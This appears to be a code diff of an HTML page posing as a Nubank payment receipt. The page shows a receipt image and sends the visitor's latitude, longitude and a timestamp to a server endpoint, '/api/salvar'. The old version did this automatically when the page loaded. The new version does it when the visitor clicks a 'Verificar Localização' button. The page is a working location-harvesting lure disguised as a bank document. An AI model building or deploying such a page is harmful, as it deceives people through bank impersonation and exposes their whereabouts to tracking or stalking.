@@ -15,26 +15,45 @@
         height: auto;
         margin-top: 20px;
       }
+      button {
+        margin-top: 20px;
+        padding: 10px 20px;
+        font-size: 16px;
+        background-color: #820ad1;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
     </style>
   </head>
   <body>
-    <h2>Carregando comprovante...</h2>
+    <h2>Comprovante Nubank</h2>
 
     <img src="/comprovante.png" alt="Comprovante Nubank" />
 
+    <button onclick="obterLocalizacao()">Verificar Localização</button>
+
     <script>
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          await fetch("/api/salvar", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude,
-              timestamp: new Date().toISOString(),
-            }),
+      function obterLocalizacao() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async (position) => {
+            await fetch("/api/salvar", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                timestamp: new Date().toISOString(),
+              }),
+            });
+            alert("Localização enviada com sucesso!");
+          }, (error) => {
+            alert("Erro ao obter localização: " + error.message);
           });
-        });
+        } else {
+          alert("Geolocalização não é suportada neste navegador.");
+        }
       }
     </script>
   </body>
